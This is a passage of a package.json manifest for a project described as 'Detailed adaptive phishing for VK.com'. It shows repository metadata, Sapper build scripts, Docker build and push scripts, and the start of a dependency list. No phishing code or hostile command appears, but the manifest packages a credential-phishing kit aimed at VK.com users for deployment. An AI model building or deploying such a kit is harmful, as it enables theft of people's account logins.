  "description": "Detailed adaptive phishing for VK.com",
  "license": "SEE LICENSE IN LICENSE.txt",
  "repository": {
    "type": "git",
    "url": "git+https://github.com/xxhax-team/vk-phishing.git"
  },
  "author": "XXHAX Team <putin@xxhax.com>",
  "homepage": "https://github.com/xxhax-team/vk-phishing#readme",
  "bugs": {
    "url": "https://github.com/xxhax-team/vk-phishing/issues"
  },
  "main": "./lib/exports.js",
  "module": "./lib/exports.mjs",
  "scripts": {
    "build": "sapper build --legacy",
    "build:exports": "rollup -c ./rollup.config.exports.js",
    "dev": "sapper dev",
    "docker:build": "npm run build && npm run docker:build-only",
    "docker:build-only": "docker build -t vk-phishing .",
    "docker:pack": "docker save vk-phishing:latest | gzip > ./vk-phishing.tar.gz",
    "docker:push": "npm run docker:tag-latest && npm run docker:push-only",
    "docker:push-only": "docker push docker.pkg.github.com/xxhax-team/vk-phishing/vk-phishing",
    "docker:run": "docker run vk-phishing:latest",
    "docker:tag-latest": "docker tag vk-phishing:latest docker.pkg.github.com/xxhax-team/vk-phishing/vk-phishing:latest",
    "export": "cross-env SAPPER_EXPORT=true sapper export --legacy",
    "lint": "eslint",
    "prettify": "prettier --config ./.prettierrc --write .",
    "start": "node __sapper__/build",
    "test": "jest",
    "update-lock-files": "npm install && yarn install"
  },
  "dependencies": {
    "@types/node-fetch": "^2.5.7",
    "arg": "^4.1.3",
    "body-parser": "^1.19.0",
    "chalk": "^4.1.0",
